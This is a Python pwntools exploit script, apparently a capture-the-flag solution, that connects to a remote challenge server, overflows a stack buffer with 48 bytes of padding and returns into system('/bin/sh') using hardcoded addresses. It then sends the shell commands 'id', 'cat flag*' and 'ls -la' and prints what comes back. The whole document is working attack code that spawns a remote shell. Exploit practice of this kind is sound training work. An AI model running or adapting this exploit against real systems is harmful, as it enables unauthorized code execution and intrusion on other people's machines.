from pwn import *

context.log_level = 'debug'

# Remote target  
p = remote("chall.0xfun.org", 49574)

# Addresses
system_plt = 0x080490a0
binsh = 0x0804a09a

offset = 44 + 4

# ret2libc: system("/bin/sh")
payload = b'A' * offset
payload += p32(system_plt)
payload += p32(0x41414141)
payload += p32(binsh)

# Wait for menu and select option 2
p.recvuntil(b"> ")
p.sendline(b"2")

# Wait for prompt and send payload  
p.recvuntil(b":")
p.sendline(payload)

# Send commands to shell
p.sendline(b"id")
p.sendline(b"cat flag*")
p.sendline(b"ls -la")

# Receive all available data
try:
    print(p.recvall(timeout=5).decode())
except:
    print(p.recv(timeout=2))
